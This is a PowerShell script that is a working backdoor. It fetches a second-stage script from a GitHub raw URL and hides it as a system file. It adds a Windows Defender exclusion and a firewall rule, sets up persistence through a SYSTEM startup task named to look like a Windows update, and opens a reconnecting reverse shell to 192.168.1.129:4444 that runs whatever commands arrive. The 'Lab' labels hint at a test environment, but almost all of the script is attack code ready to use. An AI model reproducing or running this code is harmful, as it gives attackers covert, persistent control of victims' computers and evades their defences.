# --- CONFIGURATION ---
$DebugMode = $true     # SET TO $false TO HIDE EVERYTHING
$LHOST = "192.168.1.129" # Your listener IP
$LPORT = 4444          # Your listener Port
$WorkDir = "C:\Win"
$ScriptName = "service.ps1"
$FullPath = Join-Path $WorkDir $ScriptName
$TaskName = "WinUpdateMaintenance"
$RemoteUrl = "https://raw.githubusercontent.com/mynahtrium/bug-free-enigma/refs/heads/main/winstart.ps1"
# ---------------------

function Log-Debug {
    param([string]$Message)
    if ($DebugMode) {
        Write-Host "[DEBUG] $(Get-Date -Format 'HH:mm:ss') - $Message" -ForegroundColor Cyan
    }
}

Log-Debug "Script initialized. Debug mode is ON."

# 1. SETUP & INSTALLATION
if (-not (Test-Path $WorkDir)) {
    Log-Debug "Creating working directory: $WorkDir"
    New-Item -Path $WorkDir -ItemType Directory -Force | Out-Null
}

# Detection: If we aren't running the specific file in C:\Win, we install and hand off
# Note: $PSCommandPath is often null when running via IEX, which is what we want here to trigger install
if ($PSCommandPath -ne $FullPath) {
    Log-Debug "Loader detected. Installing to $FullPath..."
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($RemoteUrl, $FullPath)
        Log-Debug "Download successful."
        
        if (-not $DebugMode) {
            attrib +h +s $FullPath
        }

        Log-Debug "Launching background process..."
        Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$FullPath`""
        
        Log-Debug "Releasing terminal. Process will continue in background."
        # Force terminate the loader session to prevent terminal hang
        Stop-Process -Id $PID 
    } catch {
        Log-Debug "Installation failed: $($_.Exception.Message)"
    }
}

# 2. SYSTEM MODIFICATIONS (Requires Admin)
try {
    Log-Debug "Updating Defender exclusions..."
    Add-MpPreference -ExclusionPath $WorkDir -ErrorAction SilentlyContinue
    
    Log-Debug "Checking Firewall rules..."
    if (-not (Get-NetFirewallRule -DisplayName "Lab Management Outbound" -ErrorAction SilentlyContinue)) {
        New-NetFirewallRule -DisplayName "Lab Management Outbound" -Direction Outbound -LocalPort $LPORT -Protocol TCP -Action Allow -ErrorAction SilentlyContinue
    }
} catch {
    Log-Debug "System mods skipped or failed (Requires Admin)."
}

# 3. PERSISTENCE
try {
    if (-not (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)) {
        Log-Debug "Registering Scheduled Task..."
        $Arg = "-ExecutionPolicy Bypass -File $FullPath"
        if (-not $DebugMode) { $Arg = "-WindowStyle Hidden " + $Arg }
        
        $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $Arg
        $Trigger = New-ScheduledTaskTrigger -AtStartup
        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -User "SYSTEM" -RunLevel Highest -ErrorAction SilentlyContinue
    }
} catch {
    Log-Debug "Persistence registration failed."
}

# 4. THE ENGINE (The Reverse Shell)
Log-Debug "Entering connection loop. Target: $LHOST:$LPORT"

while ($true) {
    $client = $null
    try {
        Log-Debug "Attempting connection to $LHOST..."
        $client = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
        $stream = $client.GetStream()
        $reader = New-Object System.IO.StreamReader($stream)
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.AutoFlush = $true

        Log-Debug "Connected! Sending identification banner."
        $writer.WriteLine("--- Lab Session Established: $(hostname) ---")
        $writer.WriteLine("--- Identity: $(whoami) ---")
        $writer.WriteLine("--- Path: $FullPath ---")
        
        while ($client.Connected) {
            $writer.Write("PS " + (Get-Location).Path + "> ")
            
            # Use Peek() to check for data without blocking forever, allowing us to detect disconnects
            $command = $reader.ReadLine()
            
            if ($null -eq $command) { 
                Log-Debug "Remote host closed the connection."
                break 
            }
            
            $command = $command.Trim()
            if ($command -eq "exit") { break }
            if ($command -eq "") { continue }

            Log-Debug "Executing: $command"
            $output = try {
                Invoke-Expression $command 2>&1 | Out-String
            } catch {
                "Error: " + $_.Exception.Message
            }

            if ([string]::IsNullOrWhiteSpace($output)) { $output = "`n" }
            $writer.Write($output)
        }
    } catch {
        Log-Debug "Connection failed: $($_.Exception.Message). Retrying in 10s..."
        Start-Sleep -Seconds 10
    } finally {
        if ($null -ne $client) { $client.Close() }
        if ($null -ne $reader) { $reader.Close() }
        if ($null -ne $writer) { $writer.Close() }
    }
}
